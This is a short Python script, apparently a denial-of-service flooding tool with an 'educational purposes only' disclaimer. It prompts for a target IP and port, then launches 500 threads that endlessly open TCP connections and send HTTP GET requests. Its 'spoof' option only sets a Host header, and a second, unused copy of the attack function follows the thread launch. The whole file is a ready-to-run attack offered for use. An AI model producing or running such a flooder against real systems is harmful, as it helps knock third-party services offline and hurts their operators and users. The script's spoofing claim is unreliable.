import socket
import threading
import os
import time


print ("Created by YAKM0")
print ("Email: YAKM0@pm.me") 
print ("Twitter: Y4KM0") 
print ("YAKM0 is not responsible for damages, this tool is for educational purposes only")
time.sleep (5)
os.system('clear')
target = input("Insert Target IP: ")
print("Target = ", target)
fake_ip = input("Type in IP to spoof from for attack ")
port = input ("Insert port to attack ")
port_a = int(port)

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port_a))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port_a))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port_a))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    
    
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port_a))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port_a))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port_a))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()
